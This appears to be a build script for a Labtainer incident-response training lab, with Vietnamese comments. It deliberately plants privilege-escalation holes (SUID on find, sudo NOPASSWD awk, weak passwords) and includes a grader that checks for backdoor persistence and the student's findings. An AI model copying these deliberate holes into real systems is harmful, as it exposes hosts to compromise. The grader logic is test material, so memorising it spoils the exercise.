cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_PE_3w8n__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_PE_3w8n__'
#!/bin/bash
# prestop siem: chup bang chung Wazuh phat hien su co (FIM /etc/passwd,/root; dang nhap tu attacker).
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (FIM passwd/root, backdoor, dang nhap tu 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -iE 'syscheck|integrity|passwd|svc-|breach|172.20.0.5|new user|added' | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_PE_3w8n__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_PE_3w8n__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
# Thiet lap: foothold emp<EMPNUM> (ca nhan hoa) + 2 duong leo quyen + FIM + ground-truth.
PW="$1"
VICTIM=empEMPNUM; VPW=Password123

# ============ 1) Foothold: tai khoan bi chiem (ca nhan hoa, mat khau yeu) ============
echo "$PW" | sudo -S useradd -m -s /bin/bash "$VICTIM" 2>/dev/null
echo "$PW" | sudo -S bash -c "echo '$VICTIM:$VPW' | chpasswd"
echo "$PW" | sudo -S sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
# GIU PermitRootLogin mac dinh (prohibit-password) - thuc te. Ke tan cong quay lai bang SSH KEY
# (prohibit-password van cho root dang nhap bang key), con tin hieu dinh ky do cronjob tao ra.
echo "$PW" | sudo -S service ssh restart 2>/dev/null || echo "$PW" | sudo -S systemctl restart ssh 2>/dev/null || true
# Bao dam rsyslog chay -> auth.log ghi day du (Accepted/sudo/new user) cho timeline & SIEM
echo "$PW" | sudo -S service rsyslog start 2>/dev/null || echo "$PW" | sudo -S systemctl start rsyslog 2>/dev/null || true

# ============ 2) LO HONG 1: SUID root tren /usr/bin/find ============
echo "$PW" | sudo -S chmod u+s /usr/bin/find

# ============ 3) LO HONG 2: sudo NOPASSWD awk cho tai khoan bi chiem ============
echo "$PW" | sudo -S bash -c "echo '$VICTIM ALL=(ALL) NOPASSWD: /usr/bin/awk' > /etc/sudoers.d/$VICTIM; chmod 440 /etc/sudoers.d/$VICTIM"

# ============ 4) Ground-truth cho grader (chi root doc) - ten ca nhan hoa ============
echo "$PW" | sudo -S bash -c "printf 'ACCT=%s\nBACKDOOR=%s\n' '$VICTIM' 'svc-EMPNUM' > /root/.soc_truth; chmod 600 /root/.soc_truth"

# ============ 5) Wazuh FIM: giam sat /etc/passwd, /etc/sudoers.d, /root, /tmp realtime ============
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/etc/passwd,/etc/sudoers.d,/etc/cron.d,/root,/tmp,/usr/local/bin</directories>'
echo "$PW" | sudo -S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# ============ 6) Tai khoan analyst cho DEFENDER SSH sang ung pho ============
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA SU CO - dien gia tri ban TU TIM DUOC (giu dinh dang KEY=value):
# -- Danh tinh (dung ten/IP THAT tren he thong cua ban) --
COMPROMISED=
IP_KE_TAN_CONG=
# -- Chuoi tan cong (neu RO CO CHE, khong chi 1 tu) --
# VECTOR1 vd: "SUID /usr/bin/find"   (phai neu 'find' VA dau hieu SUID)
# VECTOR2 vd: "sudo NOPASSWD awk"    (phai neu 'sudo' VA 'awk')
VECTOR1=
VECTOR2=
BACKDOOR=
# -- Timeline (dang HH:MM) - PHAI KHOP GIO THAT trong auth.log/SIEM (cham dung sai +-1 phut) --
# 3 moc xay ra o 3 thoi diem KHAC NHAU (cach nhau ~2'): dang nhap -> leo quyen -> cai backdoor.
TIME_ACCESS=
TIME_ESCALATION=
TIME_PERSIST=
FND
echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_PE_3w8n__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/prestop" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (cham diem IR).
# QUAN TRONG: chi in CO (presence flag) / OK, KHONG in ten tai khoan ca nhan hoa, IOC,
# hay gio that -> tranh sinh vien doc prestop.stdout de chep dap an.
trap "echo Timed out; exit" SIGTERM

# Chi giu DUY NHAT ban chup moi nhat (tranh grader doc nham ban cu truoc khi co su co).
ls -t /home/ubuntu/.local/result/prestop.stdout.* 2>/dev/null | tail -n +2 | xargs -r rm -f 2>/dev/null

echo "PRESTOP_MARKER"

# Ground-truth (ten ca nhan hoa + gio that) - chi root doc, KHONG in ra
TACCT=$(sudo -n grep '^ACCT=' /root/.soc_truth 2>/dev/null | cut -d= -f2)
TBD=$(sudo -n grep '^BACKDOOR=' /root/.soc_truth 2>/dev/null | cut -d= -f2)

# ================= HIEN TRANG MAY (cham eradication/containment) =================
# --- Leo quyen 1: /usr/bin/find con SUID? ---
case "$(stat -c '%a' /usr/bin/find 2>/dev/null)" in 4*|6*|7*|2*|3*) echo "SUID_VULN_PRESENT";; esac
# --- Leo quyen 2: con sudo NOPASSWD cho tai khoan bi chiem? ---
sudo -n grep -rhiE 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -qi "$TACCT" && echo "SUDO_VULN_PRESENT"
# --- Persistence lop 1: con tai khoan UID 0 la (backdoor)? ---
awk -F: '($3==0 && $1!="root"){f=1} END{if(f) print "UID0USER_PRESENT"}' /etc/passwd 2>/dev/null
# --- Persistence lop 2: SSH key la trong /root/.ssh/authorized_keys? ---
sudo -n grep -q 'backdoor@attacker' /root/.ssh/authorized_keys 2>/dev/null && echo "SSHKEY_PRESENT"
# --- Persistence lop 3: SUID backdoor an? ---
case "$(stat -c '%a' /usr/local/bin/.dbus-cache 2>/dev/null)" in 4*|6*|7*|2*|3*) echo "SUIDBD_PRESENT";; esac
# --- Persistence lop 4: cronjob doc? ---
[ -f /etc/cron.d/sysbackup ] && echo "CRONBD_PRESENT"
# --- Foothold: tai khoan bi chiem con dang nhap duoc? (shadow chua bi khoa) ---
SH=$(sudo -n grep "^$TACCT:" /etc/shadow 2>/dev/null | cut -d: -f2)
case "$SH" in ""|"!"*|"*"*) : ;; *) echo "FOOTHOLD_OPEN";; esac
# --- Containment: da chan IP ke tan cong bang iptables chua? ---
sudo -n iptables -S 2>/dev/null | grep -qE '172\.20\.0\.5(/32)?.*-j (DROP|REJECT)' && echo "CONTAINED"

# ================= BAO CAO IOC CUA ANALYST (so khop ground-truth, chi in OK) =================
F=/home/analyst/findings.txt
# VECTOR1 phai neu DUNG co che: 'find' VA dau hieu SUID (suid/4000/u+s)
V1=$(grep -i '^VECTOR1=' "$F" 2>/dev/null)
echo "$V1" | grep -qi 'find' && echo "$V1" | grep -qiE 'suid|4000|u\+s|u\-s' && echo "REP_V1_OK"
# VECTOR2 phai neu DUNG co che: 'awk' VA 'sudo'
V2=$(grep -i '^VECTOR2=' "$F" 2>/dev/null)
echo "$V2" | grep -qi 'awk' && echo "$V2" | grep -qi 'sudo' && echo "REP_V2_OK"
# Tai khoan + backdoor: khop ground-truth ca nhan hoa (chong chep)
[ -n "$TACCT" ] && grep '^COMPROMISED=' "$F" 2>/dev/null | grep -q "$TACCT" && echo "REP_ACCT_OK"
[ -n "$TBD" ]   && grep '^BACKDOOR='    "$F" 2>/dev/null | grep -q "$TBD"   && echo "REP_BD_OK"
grep '^IP_KE_TAN_CONG=' "$F" 2>/dev/null | grep -q '172.20.0.5' && echo "REP_IP_OK"

# ================= TIMELINE (A2): so khop GIO THUC TE trong auth.log (dung sai +-1 phut) =================
AL=/var/log/auth.log
gt_time(){ sudo -n grep -aE "$1" "$AL" 2>/dev/null | grep -oE '[0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1 | cut -c1-5; }
GT_A=$(gt_time "Accepted .*for $TACCT .*172\.20\.0\.5")
GT_E=$(gt_time "sudo:.*$TACCT .*COMMAND=/usr/bin/awk")
GT_P=$(gt_time "new user: name=$TBD")
A=$(grep '^TIME_ACCESS='     "$F" 2>/dev/null | cut -d= -f2- | tr -d ' ')
E=$(grep '^TIME_ESCALATION=' "$F" 2>/dev/null | cut -d= -f2- | tr -d ' ')
P=$(grep '^TIME_PERSIST='    "$F" 2>/dev/null | cut -d= -f2- | tr -d ' ')
to_min(){ local hh=${1%%:*} mm=${1##*:}; case "$hh$mm" in ""|*[!0-9]*) return 1;; esac; echo $((10#$hh*60 + 10#$mm)); }
close(){ local s g d; s=$(to_min "$1") || return 1; g=$(to_min "$2") || return 1; d=$(( s>g ? s-g : g-s )); [ "$d" -le 1 ]; }
close "$A" "$GT_A" && echo "TIME_ACCESS_OK"
close "$E" "$GT_E" && echo "TIME_ESC_OK"
close "$P" "$GT_P" && echo "TIME_PERSIST_OK"
# Timeline dat khi CA 3 moc khop gio that VA dung thu tu (access <= escalation <= persist)
if close "$A" "$GT_A" && close "$E" "$GT_E" && close "$P" "$GT_P"; then
  am=$(to_min "$A"); em=$(to_min "$E"); pm=$(to_min "$P")
  [ "$am" -le "$em" ] && [ "$em" -le "$pm" ] && echo "TIMELINE_OK"
fi

exit 0
__EOF_PE_3w8n__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_PE_3w8n__'
wazuh-agent
sudo
iptables
iptables-save
__EOF_PE_3w8n__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/attacker/*.sh "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-privesc"
